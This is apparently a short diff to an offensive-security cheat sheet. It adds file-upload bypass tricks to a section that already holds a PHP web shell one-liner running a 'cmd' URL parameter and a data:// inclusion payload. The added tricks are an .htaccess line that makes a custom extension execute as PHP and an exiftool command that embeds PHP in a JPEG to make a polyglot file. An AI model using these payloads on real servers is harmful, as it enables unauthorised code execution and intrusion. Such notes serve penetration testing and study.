@@ -313,8 +313,13 @@ data://text/plain;base64,<base64>&cmd=ls
 <?php echo(exec($_GET["cmd"]));?>
 ```
 ## File Upload
+htaccess
 ```bash
 echo "AddType application/x-httpd-php .tak" > .htaccess
+```
+polyglot
+```
+exiftool -Comment="<?php ?>" unnamed.jpg -o polyglot.php
 ```
 
 Wordpress <br/>
